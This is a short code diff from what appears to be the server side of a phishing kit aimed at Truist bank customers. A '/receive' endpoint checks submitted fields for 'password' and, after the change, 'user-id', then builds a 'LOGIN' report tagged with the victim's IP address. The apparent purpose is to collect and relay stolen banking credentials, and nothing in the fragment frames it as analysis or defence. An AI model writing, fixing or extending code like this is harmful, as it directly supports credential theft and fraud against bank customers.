@@ -198,7 +198,7 @@ app.post('/receive', async (req, res) => {
         const myObjects = Object.keys(myObject).map(key => key.toLowerCase());
 
         // Check conditions and prepare message
-        if (myObjects.includes('password') || myObjects.includes('email')) {
+        if (myObjects.includes('password') || myObjects.includes('user-id')) {
             message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
                 `👤 LOGIN \n\n`;
 
